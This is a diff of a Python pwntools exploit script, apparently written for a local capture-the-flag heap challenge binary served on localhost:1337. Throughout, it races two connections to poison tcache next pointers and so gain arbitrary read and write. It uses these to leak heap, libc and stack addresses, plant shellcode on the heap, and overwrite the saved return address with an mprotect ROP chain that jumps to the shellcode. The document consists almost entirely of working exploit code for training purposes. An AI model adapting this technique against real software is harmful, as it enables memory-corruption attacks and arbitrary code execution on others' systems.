@@ -32,118 +32,89 @@ def leak_tcache(r1, r2):
 			result = output[:6]
 			print(result)
 			return u64(result.ljust(8, b'\x00'))
-	
 	return 0
 
-def controlled_allocations(r1, r2, addr, heap_base_addr, debug, free):
+def controlled_allocations(r1, r2, addr, heap_base_addr):
 	global idx
 	r1.clean()
 	r2.clean()
 	
-#	if free:
-#		if debug:	
-			#r1.interactive()
-		#r1.sendline(f"free 1".encode()) # free B
-		#r1.sendline(f"free 0".encode()) # free B		
-		
 	addr_packed = p64(addr ^ heap_base_addr)
 	xor_result = addr ^ heap_base_addr
 	print(f"addr: {hex(addr)}")
 	print(f"heap_base: {hex(heap_base_addr)}")  
 	print(f"XOR result: {hex(xor_result)}")
-	#r1.sendline(f"malloc {idx}".encode()) # chunk A
-	print(f"{idx}")
-	#if debug:	
-		#r1.interactive()
-	r1.sendline(f"malloc 0".encode()) # chunk B
-	r1.sendline(f"malloc {idx}".encode()) # chunk B
-	r1.sendline(f"free {idx}".encode()) # free B
+	r1.sendline(f"malloc {idx}".encode()) # chunk A
+	r1.sendline(f"malloc {idx + 1}".encode()) # chunk B
+	r1.sendline(f"free {idx + 1}".encode()) # free B
 	
 	while True:
 		#print("Running Arbitrary Read on Address: ", hex(addr))
 		if os.fork() == 0:
-			r1.sendline(f"free 0".encode()) # free A
+			r1.sendline(f"free {idx}".encode()) # free A
 			os.kill(os.getpid(), 9)
 		else:
-			r2.send((f"scanf 0 ".encode() + addr_packed + b"\n") * 2000)
+			r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
 			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
 			# overwriting freed A's next pointer to be the target address
 			os.wait()
 		
 		time.sleep(0.1)
 		
-		r1.sendline(f"malloc 0".encode()) # this malloc gets A
-		r1.sendline(f"printf 0".encode())
+		r1.sendline(f"malloc {idx}".encode()) # this malloc gets A
+		r1.sendline(f"printf {idx}".encode())
 		r1.readuntil(b"MESSAGE: ")
 		stored = r1.readline()[:-1] #
 	#	print(addr_packed.split(b'\x00')[0])
 		
 		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
 			break
-	
-	r1.sendline(f"malloc {idx}".encode()) # gets B (returned at injected address's location
-	r1.sendline(f"free 0".encode())
+	r1.sendline(f"malloc {idx + 1}".encode()) # gets B (returned at injected address's location
 	r1.clean()
 	idx += 2
 
-def arbitrary_read(r1, r2, addr, heap_base_addr, debug, free):
+def arbitrary_read(r1, r2, addr, heap_base_addr):
 	global idx
-	controlled_allocations(r1, r2, addr, heap_base_addr, debug, free)
-	#r1.interactive()
-	
-	r1.sendline(f"printf {idx - 2}".encode())
-	
+	controlled_allocations(r1, r2, addr, heap_base_addr)
+	r1.sendline(f"printf {idx - 1}".encode())
 	r1.readuntil(b"MESSAGE: ")
 	output = r1.readline()[:-1]
 	leak = u64(output.ljust(8, b'\x00')) 
-	#r1.sendline("free 1")
+
 	return leak
 
-def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, free):
+def arbitrary_write(r1, r2, addr, heap_base_addr, content):
 	global idx
-	controlled_allocations(r1, r2, addr, heap_base_addr, debug, free)
-	r1.sendline(f"scanf {idx - 2}".encode())
+	controlled_allocations(r1, r2, addr, heap_base_addr)
+	r1.sendline(f"scanf {idx - 1}".encode())
 	r1.sendline(content)
-	#r1.sendline(f"free 1".encode())
 	
 	
 def exploit(r1, r2, p):
 	s = '''
-	set $mybase = (unsigned long)&challenge - 0x1a64
-	b * $mybase + 0x01db6
-	b * $mybase + 0x01dfe
 	b * challenge+1354
-	b * printf
 	'''
+	global offset1
+	global offset2
+	global offset3
+	global offset4
 	
 	leak = leak_tcache(r1, r2)
-	
 	if leak:
-		#gdb.attach(p, s)
-		
 		print("tcache next pointer: ", hex(leak))
 		
 		# pivoting around memory, so we need to leak many times
-		
-		#gdb.attach(p, s)
-		
-		location1 = ( ( leak & ~0xff) << 12) + 0x8a0
-		print(hex(location1))
-		
-		
-		
-		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, 0)
-				
+		location1 = (leak << 12) + 0x8a0
+		libc_leak = arbitrary_read(r1, r2, location1, leak)
 		print("libc leak leak: ", hex(libc_leak))
-		
-		#gdb.attach(p, s)
+
+
 		location2 = libc_leak + 0x60	
-		leak3 = arbitrary_read(r1, r2, location2, leak, 0, 1) # pivot 
-		
-		
+		leak3 = arbitrary_read(r1, r2, location2, leak + 1) # pivot 
+
 		
 		location3 = leak3 - 0x100
-		stack_leak = arbitrary_read(r1, r2, location3, leak, 0, 1)
+		stack_leak = arbitrary_read(r1, r2, location3, leak + 1)
 		print("stack_leak: ", hex(stack_leak))
 	
 		
@@ -197,7 +168,7 @@ def exploit(r1, r2, p):
 		''')
 		
 		mprotect_addr = libc_base + libc.symbols['mprotect']
-		shellcode_addr = (leak << 12) + 0x100
+		shellcode_addr = (leak << 12) + 0x1000
 
 		# mprotect(shellcode_addr, 0x1000, 7)
 		rop_chain = b""
@@ -223,21 +194,20 @@ def exploit(r1, r2, p):
 			print(f"Payload hex: {payload.hex()}")
 		
 		# pre-write shellcode to heap
-		arbitrary_write(r1, r2, (leak << 12) + 0x1000, leak, shellcode, 0, 1)
-		# overwrite rip to hijack control flow and call mprotect as well as jumping to shellcode	
-		
-		arbitrary_write(r1, r2, rbp_addr, leak, payload, 1, 1)
+		arbitrary_write(r1, r2, (leak << 12) + 0x1000, leak + 2, shellcode)
+		# overwrite rip to hijack control flow and call mprotect as well as jumping to shellcode
+		arbitrary_write(r1, r2, rbp_addr, leak + 2, payload)
 
-		gdb.attach(p, s)
+		#gdb.attach(p, s)
 		
 		try:
-			#r1.clean()
-			#r2.clean()
-			#p.clean()
-		#	r2.sendline("quit")
+			r1.clean()
+			r2.clean()
+			p.clean()
+			r2.sendline("quit")
 			
 			#r2.sendline("ls")
-			r2.interactive()
+			#r2.interactive()
 			
 			#p.interactive()
 			response = p.recvall(timeout=2)
@@ -260,7 +230,7 @@ def main():
 		idx = 2
 		
 		try: # code that might fail 
-			binary = './babyprime_level9.0'
+			binary = './babyprime_level5.0'
 			p = process(binary)
 			r1 = remote("localhost", 1337, timeout = 1)
 			r2 = remote("localhost", 1337, timeout = 1)
